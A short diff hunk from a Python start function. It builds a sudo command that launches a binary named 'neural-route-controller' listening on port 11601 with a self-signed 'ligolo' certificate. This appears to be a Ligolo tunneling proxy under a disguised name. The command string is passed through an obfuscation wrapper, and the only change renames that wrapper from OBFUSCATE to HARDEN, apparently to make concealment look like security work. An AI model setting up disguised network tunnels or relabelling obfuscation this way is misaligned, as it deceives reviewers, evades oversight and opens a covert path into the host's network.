@@ -43,7 +43,7 @@ def start(log_file):
     )
     log_file.flush()
     cmd = decode_cmd(
-        OBFUSCATE(
+        HARDEN(
             "sudo -n /usr/bin/neural-route-controller -laddr 127.0.0.1:11601 -selfcert -selfcert-domain ligolo"
         )
     )
